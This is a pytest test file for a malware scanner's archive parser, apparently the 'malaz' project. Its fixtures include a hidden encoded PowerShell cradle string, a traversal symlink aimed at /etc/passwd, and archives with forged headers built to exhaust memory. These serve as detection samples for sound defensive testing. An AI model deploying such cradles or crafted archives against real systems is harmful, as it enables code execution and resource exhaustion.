import bz2
import gzip
import io
import os
import struct
import sys
import tarfile
import tracemalloc
import zipfile
import zlib
from pathlib import Path

import pytest

from malaz import config
from malaz.analysis.clamav import ClamAVScanner
from malaz.analysis.windows_av import WindowsDefenderScanner
from malaz.core import archive as archive_module
from malaz.core.archive import (
    _declared_zip_entry_count,
    _zipslip_note,
    iter_compressed_members,
    iter_single_stream,
    iter_zip_members,
    split_unsafe_names,
)
from malaz.core.dispatcher import Dispatcher
from malaz.models import AnalysisContext, RiskLevel, Severity
from malaz.pipelines.archive_pipeline import ArchivePipeline


@pytest.fixture()
def dispatcher():
    # Beide AV-Engines aus: der Vertrag dieser Tests ist die statische Analyse,
    # und ein echter Engine-Aufruf pro Mitglied waere weder schnell noch
    # deterministisch (gleiche Fixture wie in test_dispatcher.py).
    return Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )


def _make_zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def test_member_with_trailing_slash_is_scanned():
    """A trailing slash is not proof of a directory.

    Measured before the fix: the same PowerShell cradle scored RED 75 as
    "evil.txt" and GREEN 0 as "evil.exe/" — the member was skipped without
    decompressing a byte, so its content was never scanned. Only a member with
    file_size == 0 is a directory.
    """
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    data = _make_zip({"evil.exe/": cradle})
    members = list(iter_zip_members(data))
    assert [n for n, p, e in members if p] == ["evil.exe/"], members


def test_forged_size_on_directory_name_is_reported():
    """A size of 0 in the central directory is a claim, not a fact.

    Measured before the fix: the same cradle as "evil.exe/" with the central
    directory size forged to 0 scored GREEN 0 with no child scan — the skip
    ran before the stream was ever opened, so the forged-size detection in
    _read_zip_member never fired. The entry is now read once: an honest
    directory yields nothing, a lying one is reported.
    """
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    data = bytearray(_make_zip({"evil.exe/": cradle}))
    cd = data.rfind(b"PK\x01\x02")
    struct.pack_into("<I", data, cd + 20, 0)  # compressed size
    struct.pack_into("<I", data, cd + 24, 0)  # uncompressed size
    members = list(iter_zip_members(bytes(data)))
    assert members, "the forged member must be reported, not skipped"
    name, _payload, error = members[0]
    assert name == "evil.exe/"
    assert error is not None and "fälscht" in error, members


def test_real_directory_entry_is_still_skipped():
    """An empty entry whose name ends in / stays a directory and is skipped."""
    data = _make_zip({"dir/": b"", "ok.txt": b"x"})
    members = [(n, len(p)) for n, p, e in iter_zip_members(data)]
    assert members == [("ok.txt", 1)], members


def test_forged_entry_count_is_caught_by_the_cd_size():
    """A small declared count must not hide a huge central directory.

    Measured before the bound: a 5.7 MB archive with 60 000 real entries and a
    forged count of 1 passed the pre-open guard, cost 40 MB peak and 22 s, and
    only the in-walk limit stopped it. size_cd cannot lie — the bytes it
    describes have to be there — so size_cd / 46 bounds the entries.
    """
    count = config.MAX_ARCHIVE_ENTRIES + 2_000
    entries = {f"f{i}.txt": b"" for i in range(count)}
    data = bytearray(_make_zip(entries))
    eocd = data.rfind(b"PK\x05\x06")
    struct.pack_into("<H", data, eocd + 10, 1)  # declared count: a lie
    bound = _declared_zip_entry_count(None, bytes(data))
    assert bound is not None and bound > config.MAX_ARCHIVE_ENTRIES, bound


def test_zip64_offset_beyond_seek_range_is_unknown():
    """An 8-byte ZIP64 offset is attacker-controlled and may not be seekable.

    Measured: 2**64-1 raised ValueError ("cannot fit 'int' into an
    offset-sized integer") out of the EOCD reader — not an OSError, so it
    escaped the helper and replaced the whole result with ARCH_ZIP_ERROR.
    """
    data = bytearray(_make_zip({"a.txt": b"hi"}))
    eocd = data.rfind(b"PK\x05\x06")
    struct.pack_into("<H", data, eocd + 10, 0xFFFF)  # "see ZIP64"
    locator = struct.pack("<IIQI", 0x07064B50, 0, 2**64 - 1, 1)
    forged = bytes(data[:eocd]) + locator + bytes(data[eocd:])
    assert _declared_zip_entry_count(None, forged) is None


def test_zip64_entry_count_is_bounded_by_its_own_size_cd():
    """The ZIP64 record's size_cd must bound the entries, not just the count.

    Measured: a classic EOCD with entries=0xFFFF and size_cd=0 passed the only
    guard, and a ZIP64 record declaring 1 entry over a 60 000-entry directory
    was returned as 1 - the archive was then opened and cost 34.5 MB peak.
    """
    count = config.MAX_ARCHIVE_ENTRIES + 2_000
    data = bytearray(_make_zip({f"f{i}.txt": b"" for i in range(count)}))
    eocd = data.rfind(b"PK\x05\x06")
    size_cd = struct.unpack_from("<I", data, eocd + 12)[0]
    struct.pack_into("<H", data, eocd + 10, 0xFFFF)  # "see ZIP64"
    struct.pack_into("<I", data, eocd + 12, 0)       # classic size_cd: a lie

    record = bytearray(56)
    struct.pack_into("<I", record, 0, 0x06064B50)
    struct.pack_into("<Q", record, 32, 1)  # entry count: a lie
    struct.pack_into("<Q", record, 40, size_cd)  # the honest size
    forged = (
        bytes(data[:eocd]) + bytes(record)
        + struct.pack("<IIQI", 0x07064B50, 0, eocd, 1)
        + bytes(data[eocd:])
    )
    bound = _declared_zip_entry_count(None, forged)
    assert bound is not None and bound > config.MAX_ARCHIVE_ENTRIES, bound


def test_large_tar_member_is_read_completely():
    """A member above the metadata read limit must still be scanned.

    The read guard exists for the METADATA pass (a PAX header is materialized
    in one read of its declared size). Member payloads were read the same way,
    so once the guard was in place every member above 1 MiB failed with
    "TAR-Lesewunsch ... überschreitet das Einzel-Limit" and its content was
    never scanned. Measured: 30 of 30 members came back with 0 bytes.
    """
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    payload = cradle + b" " * (2 * 1024 * 1024 - len(cradle))
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tf:
        info = tarfile.TarInfo("evil.bin")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

    members = list(iter_compressed_members(gzip.compress(buffer.getvalue()), "tar.gz"))
    named = [(name, data, error) for name, data, error in members if name]
    assert named, members
    name, data, error = named[0]
    assert name == "evil.bin", named
    assert error is None, error
    assert data.startswith(cradle), len(data)


def test_members_before_an_oversized_one_are_still_scanned():
    """The oversized break must not discard the members already collected.

    Measured: a .tar.gz whose first member carried a PowerShell cradle and
    whose second exceeded the limit scored YELLOW 25 with no child at all —
    the cradle was never examined, because the note returned early.
    """
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tf:
        first = tarfile.TarInfo("evil.txt")
        first.size = len(cradle)
        tf.addfile(first, io.BytesIO(cradle))
        big = b"\x00" * (config.MAX_SINGLE_STREAM_BYTES + 1024)
        second = tarfile.TarInfo("big.bin")
        second.size = len(big)
        tf.addfile(second, io.BytesIO(big))

    members = list(iter_compressed_members(gzip.compress(buffer.getvalue()), "tar.gz"))
    payloads = {name: data for name, data, error in members if name and data}
    assert payloads.get("evil.txt") == cradle, list(payloads)


def test_honest_archive_below_the_entry_limit_is_not_refused():
    """The central-directory count must be exact, not an estimate.

    A record is 46 + name + extra + comment bytes, so size_cd // 46 is always
    larger than the real count: measured, 9 000 entries (limit 10 000) gave a
    bound of 10 736 and were refused as "too many entries".
    """
    count = 9_000
    data = _make_zip({f"f{i}.txt": b"" for i in range(count)})
    assert _declared_zip_entry_count(None, data) == count


def test_symlink_with_traversal_name_is_reported():
    """A non-file entry can carry a traversal name too.

    The name check only ran for regular files, and the payload walk skips
    everything else, so a TAR whose only suspicious entry was a symlink named
    "../../etc/evil" produced no yield and no note — measured GREEN 0 with no
    indicator at all.
    """
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tf:
        link = tarfile.TarInfo("../../etc/evil")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        tf.addfile(link)
        ok = tarfile.TarInfo("ok.txt")
        ok.size = 2
        tf.addfile(ok, io.BytesIO(b"hi"))

    members = list(iter_compressed_members(gzip.compress(buffer.getvalue()), "tar.gz"))
    notes = [e for _n, _p, e in members if e]
    assert notes, members
    assert any("Zip-Slip" in note for note in notes), notes


def test_data_descriptor_flag_cannot_hide_the_stream():
    """Flag bit 3 makes the stdlib skip its own size clamp.

    With bit 3 set, ZipExtFile sets _left = None, so the clamp on
    file_size + 1 does not apply and the first chunk crosses the limit. The
    loop used to break there and drop the chunk, leaving payload empty — and
    an empty payload with CRC 0 passes every check, so the member came back as
    (b"", None), i.e. "honest empty member". The overrun is recorded now.
    """
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    data = bytearray(_make_zip({"evil.bin": cradle}))
    local = data.find(b"PK\x03\x04")
    struct.pack_into("<H", data, local + 6, data[local + 6] | 0x8)
    central = data.find(b"PK\x01\x02")
    struct.pack_into("<H", data, central + 8, data[central + 8] | 0x8)
    struct.pack_into("<I", data, central + 16, 0)  # CRC
    struct.pack_into("<I", data, central + 24, 0)  # uncompressed size

    with zipfile.ZipFile(io.BytesIO(bytes(data))) as zf:
        info = zf.infolist()[0]
        payload, error = archive_module._read_zip_member(zf, info)
    assert payload is None, payload
    assert error is not None and "gefälscht" in error, error


def test_xz_dictionary_size_is_bounded():
    """The .xz block header declares the LZMA2 dictionary the decoder allocates.

    Measured before the cap: a 72-byte .xz declaring a 1 GiB dictionary
    produced a 2149 MB tracemalloc peak and scored GREEN 0 - the chunked read
    never helped, because the allocation happens while parsing the header.
    LZMAFile has no memlimit (TypeError); LZMADecompressor does.
    """
    import lzma as _lzma

    filters = [
        {
            "id": _lzma.FILTER_LZMA2,
            "preset": 9 | _lzma.PRESET_EXTREME,
            "dict_size": 1 << 30,
        }
    ]
    payload = _lzma.compress(b"hi" * 100, format=_lzma.FORMAT_XZ, filters=filters)
    assert len(payload) < 1024, len(payload)

    tracemalloc.start()
    try:
        members = list(iter_single_stream(payload, "xz"))
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert peak < 100 * 1024 * 1024, f"{peak / 1e6:.1f} MB peak"
    assert members, "the refusal must be reported"


def test_tar_xz_buffer_stays_bounded():
    """tarfile seeks over every member; the reader must not keep the stream.

    Measured before the window: a 0.1 MB .tar.xz with 20 x 40 MB members
    peaked at 1327 MB and ran 76 s, scoring GREEN 0.
    """
    import lzma as _lzma

    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tf:
        for i in range(20):
            payload = bytes([i]) * (40 * 1024 * 1024)
            info = tarfile.TarInfo(f"m{i}.bin")
            info.size = len(payload)
            tf.addfile(info, io.BytesIO(payload))
    packed = _lzma.compress(buffer.getvalue(), format=_lzma.FORMAT_XZ, preset=1)

    tracemalloc.start()
    try:
        members = list(iter_compressed_members(packed, "xz"))
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert peak < 200 * 1024 * 1024, f"{peak / 1e6:.1f} MB peak"
    assert members, "the container must be reported, not silently dropped"


def test_xz_preset_9_is_still_readable():
    """xz -9 uses a 64 MiB dictionary plus overhead; the cap must allow it.

    Measured: with the cap at MAX_SINGLE_STREAM_BYTES (64 MiB) an ordinary
    preset-9 stream failed with "Memory usage limit exceeded".
    """
    import lzma as _lzma

    payload = os.urandom(200_000) + b"hello world " * 50_000
    packed = _lzma.compress(payload, format=_lzma.FORMAT_XZ, preset=9)
    members = list(iter_single_stream(packed, "xz"))
    data = b"".join(chunk for _n, chunk, _e in members)
    assert data == payload, (len(data), len(payload))


def test_tar_xz_still_reads_members():
    """The dictionary cap must not break ordinary .tar.xz archives."""
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:xz") as tf:
        info = tarfile.TarInfo("evil.txt")
        info.size = len(cradle)
        tf.addfile(info, io.BytesIO(cradle))

    members = list(iter_compressed_members(buffer.getvalue(), "xz"))
    named = [(name, data) for name, data, error in members if name]
    assert named == [("evil.txt", cradle)], members


def test_crc_failure_does_not_stop_the_password_loop():
    """A wrong candidate can pass the 1-byte ZipCrypto check by chance.

    It then decrypts to garbage and fails the CRC check, which arrives as an
    error. Returning at the first error gave up on a member the NEXT candidate
    would have opened. The loop keeps the first error and tries the rest.
    """
    import zipfile as _zipfile

    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    buffer = io.BytesIO()
    with _zipfile.ZipFile(buffer, "w", _zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("evil.txt", cradle)

    calls: list[str] = []

    def fake_read(_zf, _info, pwd=None):
        calls.append(pwd.decode() if pwd is not None else "<none>")
        if pwd == b"second":
            return cradle, None
        return None, "CRC-Prüfsumme stimmt nicht"

    original = archive_module._read_zip_member
    archive_module._read_zip_member = fake_read
    try:
        with _zipfile.ZipFile(io.BytesIO(buffer.getvalue())) as zf:
            info = zf.infolist()[0]
            payload, error = archive_module._read_encrypted(zf, info, ["first", "second"])
    finally:
        archive_module._read_zip_member = original
    assert payload == cradle, (payload, error, calls)
    assert calls == ["first", "second"], calls


def test_member_name_starting_with_paren_is_not_mangled():
    """A member name is attacker-controlled and may begin with "(".

    The walk deadline used to store a sentence in oversized_member and the
    note distinguished the two by a leading "(" — measured: a member named
    "(evil)" was rendered as "evil".
    """
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tf:
        big = b"\x00" * (config.MAX_SINGLE_STREAM_BYTES + 1024)
        info = tarfile.TarInfo("(evil)")
        info.size = len(big)
        tf.addfile(info, io.BytesIO(big))

    members = list(iter_compressed_members(gzip.compress(buffer.getvalue()), "tar.gz"))
    notes = [e for _n, _p, e in members if e]
    assert notes, members
    assert "(evil)" in notes[0], notes


def test_oversized_member_does_not_report_a_cut_stream():
    """A mid-walk stop is not a truncation.

    Measured: a COMPLETE .tar.gz whose first member exceeded the limit was
    reported as "endet ohne Endmarker - gekappter Download", because the
    truncation check ran on a tf positioned inside the archive. BUG-002 fixed
    that for the entry limit only; the oversized break stops the same way.
    """
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tf:
        big = b"\x00" * (config.MAX_SINGLE_STREAM_BYTES + 1024)
        info = tarfile.TarInfo("big.bin")
        info.size = len(big)
        tf.addfile(info, io.BytesIO(big))
        small = tarfile.TarInfo("ok.txt")
        small.size = 2
        tf.addfile(small, io.BytesIO(b"hi"))

    members = list(iter_compressed_members(gzip.compress(buffer.getvalue()), "tar.gz"))
    notes = [e for _n, _p, e in members if e]
    assert notes, members
    assert not any("Endmarker" in note for note in notes), notes
    assert any("überschreitet" in note for note in notes), notes


def test_pax_header_with_huge_declared_size_is_bounded():
    """A PAX/longname header must not be materialized at its declared size.

    Measured before the guard: a 78-byte .tar.gz whose PAX header declared
    8 GB produced an 8.59 GB tracemalloc peak and scored GREEN 0. The guard
    sits on the DECOMPRESSED side — wrapping only the compressed bytes leaves
    tarfile's own GzipFile to assemble the buffer (measured: still 8.59 GB).
    """
    body = b"30 path=" + b"A" * 10 + b"\n"
    header = bytearray(512)
    header[0:3] = b"./x"
    header[100:108] = b"0000644\x00"
    header[108:116] = b"0000000\x00"
    header[116:124] = b"0000000\x00"
    header[124:136] = ("%011o\x00" % (8 * 1024**3)).encode()
    header[136:148] = b"00000000000\x00"
    header[156:157] = b"x"
    header[257:263] = b"ustar\x00"
    header[263:265] = b"00"
    checksum = sum(header[:148]) + sum(header[156:]) + 32 * 8
    header[148:156] = (f"{checksum:06o}\x00 ").encode()
    raw = bytes(header) + body + b"\x00" * ((-len(body)) % 512)

    tracemalloc.start()
    try:
        list(iter_compressed_members(gzip.compress(raw), "tar.gz"))
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert peak < 100 * 1024 * 1024, f"{peak / 1e6:.1f} MB peak"


def test_tar_padding_does_not_hide_an_appended_archive():
    """1 MiB of zero bytes must not push an appended TAR out of the check.

    Measured before the fix: benign TAR + 1 MiB zeros + TAR with a PowerShell
    cradle scored GREEN 0 with only the benign member scanned, because the
    tail check stopped at its 1 MiB window and called the padding clean.
    """
    cradle = b"powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="

    def one_member(name, payload):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            info = tarfile.TarInfo(name)
            info.size = len(payload)
            tf.addfile(info, io.BytesIO(payload))
        return buf.getvalue()

    raw = one_member("a.txt", b"hi") + b"\x00" * (1024 * 1024) + one_member("evil.txt", cradle)
    members = list(iter_compressed_members(gzip.compress(raw), "tar.gz"))
    notes = [e for _n, _p, e in members if e]
    assert notes, "the unexamined remainder must be reported"
    assert "Endmarker" in notes[0], notes


def _ctx(data: bytes, name="a.zip") -> AnalysisContext:
    return AnalysisContext(path=Path(name), data=data, detected_type="zip", size=len(data))


def _scan_file(dispatcher, data: bytes, path: Path):
    """Scan ``data`` as a real file at ``path`` (the consumer's view)."""
    path.write_bytes(data)
    return dispatcher.scan_path(path)


def test_recursive_nested_zip_is_flagged_as_hint():
    payload = _make_zip({"note.txt": b"nur ein Hinweis"})
    inner = _make_zip({"payload.zip": payload})
    inds = ArchivePipeline().analyze(_ctx(_make_zip({"inner.zip": inner})))
    nested = [i for i in inds if i.rule_id == "ARCH_NESTED_ARCHIVE"]
    assert len(nested) == 1
    assert nested[0].weight == 20
    assert "inner.zip" in nested[0].detail


def test_nested_probe_is_budgeted(monkeypatch):
    """Der zweite Lesevorgang darf nicht unbegrenzt entpacken."""
    from malaz.pipelines import archive_pipeline

    payload = _make_zip({"note.txt": b"x"})
    inner = _make_zip({"payload.zip": payload})
    outer = _make_zip({f"inner{i}.zip": inner for i in range(20)})
    calls: list[str] = []
    original = archive_pipeline._read_zip_member

    def counting(archive, info):
        calls.append(info.filename)
        return original(archive, info)

    monkeypatch.setattr(archive_pipeline, "_read_zip_member", counting)
    inds = ArchivePipeline().analyze(_ctx(outer))
    nested = [i for i in inds if i.rule_id == "ARCH_NESTED_ARCHIVE"]
    assert len(nested) == 1
    assert "8 Einträge" in nested[0].title
    assert len(calls) == archive_pipeline._NESTED_MAX_HITS


def test_single_archive_level_is_not_flagged():
    """Der gemessene Harmlos-Fall: bundle.zip → bundle/inner.zip → Dateien."""
    inner = _make_zip({"data/values.csv": b"a,b\n1,2\n"})
    inds = ArchivePipeline().analyze(
        _ctx(_make_zip({"bundle/inner.zip": inner, "bundle/manifest.txt": b"1.0"}))
    )
    assert not any(i.rule_id == "ARCH_NESTED_ARCHIVE" for i in inds)


def test_nested_zip_verdict_flips_to_yellow(dispatcher, tmp_path):
    """AP5: ohne die Regel wäre dieses Archiv GRÜN (Kinder sind harmlos)."""
    payload = _make_zip({"note.txt": b"nur ein Hinweis"})
    inner = _make_zip({"payload.zip": payload})
    result = _scan_file(
        dispatcher, _make_zip({"inner.zip": inner}), tmp_path / "nested.zip"
    )
    assert result.risk_level == RiskLevel.YELLOW
    assert "ARCH_NESTED_ARCHIVE" in {i.rule_id for i in result.all_indicators()}
    assert all(child.risk_level == RiskLevel.GREEN for child in result.children)


def test_pe_with_embedded_zip_stays_green(dispatcher, tmp_path):
    """Der harmlose Go-/Electron-Installer: PE mit eingebettetem App-ZIP."""
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
    from make_test_corpus_extended import _NEUTRAL_IMPORT, _import_pe

    inner = _make_zip({"app.txt": b"resources"})
    installer = _import_pe((_NEUTRAL_IMPORT,), extra_overlay=inner)
    result = _scan_file(dispatcher, installer, tmp_path / "installer.exe")
    assert result.detected_type == "pe"
    assert result.risk_level == RiskLevel.GREEN
    assert "ARCH_NESTED_ARCHIVE" not in {i.rule_id for i in result.all_indicators()}


def test_normal_zip_no_findings():
    data = _make_zip({"hello.txt": b"hi"})
    inds = ArchivePipeline().analyze(_ctx(data))
    assert not any(i.rule_id == "ARCH_ZIPSLIP" for i in inds)


def test_zipslip_detected():
    data = _make_zip({"../evil.txt": b"pwn"})
    inds = ArchivePipeline().analyze(_ctx(data))
    assert any(i.rule_id == "ARCH_ZIPSLIP" for i in inds)


def test_iter_scans_unsafe_members_instead_of_skipping_them():
    """The name decides whether we would WRITE a member, never whether we look.

    Measured before this contract: the same PowerShell cradle scored RED 90 as
    "payload.txt" and YELLOW 35 as "..payload.txt", because the member was
    skipped entirely and no child scan happened. Nothing is ever written here,
    so the payload is decompressed in memory and scanned; the name itself is
    reported separately by ARCH_UNSAFE_NAME.
    """
    data = _make_zip({"good.txt": b"ok", "../bad.txt": b"no"})
    members = {name: payload for name, payload, err in iter_zip_members(data) if err is None}
    assert members.get("good.txt") == b"ok"
    assert members.get("../bad.txt") == b"no"


def test_iter_yields_content():
    data = _make_zip({"a.txt": b"content-a"})
    members = list(iter_zip_members(data))
    assert members[0][0] == "a.txt"
    assert members[0][1] == b"content-a"
    assert members[0][2] is None


def _mark_members_encrypted(data: bytes) -> bytes:
    """Set the encryption bit in local and central headers (no re-encoding).

    ``zipfile`` cannot WRITE encrypted archives, so a fake ``setpassword``
    (the previous test) never exercised the encryption path. Flipping the flag
    in both headers is enough to make ``zipfile`` demand a password; the
    stream itself is not ZipCrypto-encrypted, which is exactly the
    "no candidate password opens it" case the error branch must handle.
    """
    out = bytearray(data)
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        position = 0
        while True:
            index = out.find(signature, position)
            if index < 0:
                break
            flags = int.from_bytes(
                out[index + flag_offset:index + flag_offset + 2], "little"
            )
            out[index + flag_offset:index + flag_offset + 2] = (flags | 1).to_bytes(
                2, "little"
            )
            position = index + 4
    return bytes(out)


def test_encrypted_member_without_password_errors():
    """TEST-013: the error path must be exercised, not just "some member"."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr("secret.txt", b"hidden")
    data = _mark_members_encrypted(buf.getvalue())

    members = list(iter_zip_members(data))
    assert len(members) == 1, members
    name, payload, error = members[0]
    assert name == "secret.txt"
    assert payload == b"", "ein verschluesseltes Mitglied darf nicht als Inhalt gelten"
    assert error and "Verschlüsselt" in error, error


# -- tar / gzip / bzip2 / xz containers ------------------------------------- #

def _make_tar(entries: dict[str, bytes], compress: str | None = None) -> bytes:
    buf = io.BytesIO()
    mode = {"gzip": "w:gz", "bzip2": "w:bz2", "xz": "w:xz"}.get(compress, "w")
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, data in entries.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _members(data: bytes, kind: str):
    return list(iter_compressed_members(data, kind))


def test_tar_plain_walked():
    data = _make_tar({"a.txt": b"hello", "sub/b.bin": b"\x00\x01"})
    names = {n: b for n, b, e in _members(data, "tar") if e is None}
    assert names == {"a.txt": b"hello", "sub/b.bin": b"\x00\x01"}


def test_tar_gz_walked_via_gzip_kind():
    data = _make_tar({"inner.txt": b"deep content"}, compress="gzip")
    names = {n: b for n, b, e in _members(data, "gzip") if e is None}
    assert names == {"inner.txt": b"deep content"}


def test_tar_bz2_and_xz_walked():
    for compress, kind in (("bzip2", "bzip2"), ("xz", "xz")):
        data = _make_tar({"f.txt": b"x" * 100}, compress=compress)
        names = [n for n, _, e in _members(data, kind) if e is None]
        assert names == ["f.txt"]


def test_tar_skips_symlinks_and_dirs():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        data = b"real content"
        info = tarfile.TarInfo("dir")
        info.type = tarfile.DIRTYPE
        tf.addfile(info)
        info = tarfile.TarInfo("link")
        info.type = tarfile.SYMTYPE
        info.linkname = "a.txt"
        tf.addfile(info)
        info = tarfile.TarInfo("a.txt")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    names = [n for n, _, e in _members(buf.getvalue(), "tar") if e is None]
    assert names == ["a.txt"]


def test_tar_scans_unsafe_names_instead_of_skipping_them():
    """Same contract as the ZIP path: unsafe name != unscanned content."""
    data = _make_tar({"good.txt": b"ok", "../bad.txt": b"no"})
    members = {n: payload for n, payload, err in _members(data, "tar") if err is None}
    assert members.get("good.txt") == b"ok"
    assert members.get("../bad.txt") == b"no"


def test_tar_oversized_member_errors(monkeypatch):
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 4)
    data = _make_tar({"big.bin": b"x" * 100})
    members = _members(data, "tar")
    assert len(members) == 1
    name, blob, err = members[0]
    assert name == "big.bin" and blob == b"" and err is not None and "zu groß" in err


def test_tar_respects_total_budget(monkeypatch):
    monkeypatch.setattr(config, "MAX_UNCOMPRESSED_SIZE", 12)
    data = _make_tar({"a.bin": b"x" * 10, "b.bin": b"y" * 10})
    ok = [m for m in _members(data, "tar") if m[2] is None]
    assert len(ok) == 1


def test_single_stream_gzip_payload():
    payload = b"just a plain text payload"
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", filename="note.txt") as gz:
        gz.write(payload)
    members = list(iter_single_stream(buf.getvalue(), "gzip"))
    assert len(members) == 1
    name, blob, err = members[0]
    assert err is None
    assert blob == payload
    assert name == "note.txt"  # from the gzip FNAME header


def test_single_stream_gzip_without_name():
    payload = b"x" * 500
    compressed = gzip.compress(payload)
    members = list(iter_single_stream(compressed, "gzip"))
    assert members[0][0] == "payload.bin"
    assert members[0][1] == payload


def test_single_stream_bz2_and_xz():
    payload = b"content" * 50
    assert next(iter(iter_single_stream(bz2.compress(payload), "bzip2")))[1] == payload
    import lzma

    assert next(iter(iter_single_stream(lzma.compress(payload), "xz")))[1] == payload


def test_single_stream_bomb_capped(monkeypatch):
    # A tiny stream expanding far beyond the cap must be stopped by the chunked
    # read, not materialised in memory.
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 1024)
    bomb = gzip.compress(b"\x00" * (1024 * 1024))
    members = list(iter_single_stream(bomb, "gzip"))
    assert len(members) == 1
    name, blob, err = members[0]
    assert name == "" and blob == b"" and err is not None
    assert "überschreitet" in err


def test_gzip_non_tar_falls_back_to_single_stream():
    payload = b"not a tar at all"
    compressed = gzip.compress(payload)
    members = _members(compressed, "gzip")
    assert len(members) == 1
    assert members[0][2] is None
    assert members[0][1] == payload


def test_corrupt_tar_kind_reports_error():
    members = _members(b"definitely not a tar archive", "tar")
    assert len(members) == 1
    name, _, err = members[0]
    assert name == "" and err is not None


# -- verschlüsselte Mitglieder ---------------------------------------------- #

def _pyzipper():
    """Optional AES-ZIP writer, skipped PER TEST rather than per module.

    ``pytest.importorskip`` auf Modulebene sprang mitten in der Datei und
    nahm damit die komplette Archiv-Suite mit (53 Tests, TEST-006). Nur die
    AES-Testfaelle brauchen das Paket.
    """
    return pytest.importorskip("pyzipper", reason="AES-ZIP-Testfälle")


def _aes_zip(members: dict, password: str) -> bytes:
    pyzipper = _pyzipper()
    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, "w", compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(password.encode())
        for name, payload in members.items():
            zf.writestr(name, payload)
    return buf.getvalue()


def test_aes_zip_reports_encrypted_limitation():
    # AES-ZIPs kann die stdlib zipfile grundsaetzlich nicht lesen (nur
    # klassisches ZipCrypto) — Malaz muss das korrekt als verschluesselt
    # melden statt zu crashen oder 'sauber' zu behaupten.
    data = _aes_zip({"geheim.txt": b"payload"}, "infected")
    from malaz.core.archive import iter_zip_members

    members = list(iter_zip_members(data))
    assert len(members) == 1
    name, payload, err = members[0]
    assert name == "geheim.txt" and payload == b""
    assert err is not None and ("Verschlüsselt" in err or "fehlgeschlagen" in err)


def test_zipcrypto_read_encrypted_password_loop():
    # _read_encrypted direkt: klassisches ZipCrypto mit gemocktem ZipFile —
    # getestet wird UNSERE Schleifenlogik (Kandidaten, leerer Fallback,
    # RuntimeError-Behandlung), nicht die stdlib. Gelesen wird ueber
    # ``open(...).read(n)`` (dasselbe Chunk-Muster wie im Klartextpfad); ein
    # falsches Passwort wirft wie in CPython erst beim ersten read().
    from malaz.core.archive import _read_encrypted

    class _Info:
        filename = "x.txt"
        # Die Laenge MUSS zum gelieferten Strom passen: die Groessenpruefung
        # vergleicht die gelesenen Bytes mit der Deklaration, und ein Strom,
        # der mehr liefert als deklariert, gilt als gefaelscht. Hier stand
        # frueher 13, waehrend b"entschluesselt" 14 Bytes hat — die Fixture
        # widersprach sich selbst und deckte damit die Pruefung zu.
        file_size = len(b"entschluesselt")
        CRC = zlib.crc32(b"entschluesselt") & 0xFFFFFFFF

    class _Stream:
        def __init__(self, payload):
            self._payload = payload

        def read(self, n=-1):
            if self._payload is None:
                raise RuntimeError("Bad password for file 'x.txt'")
            data, self._payload = self._payload, b""
            return data

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    class FakeZip:
        def __init__(self, working_pwd):
            self._working = working_pwd

        def open(self, info, pwd=None):
            ok = pwd is not None and pwd.decode() == self._working
            return _Stream(b"entschluesselt" if ok else None)

    # Erstes Kandidaten-Passwort passt
    assert _read_encrypted(FakeZip("infected"), _Info(), ["infected"]) == (
        b"entschluesselt", None,
    )
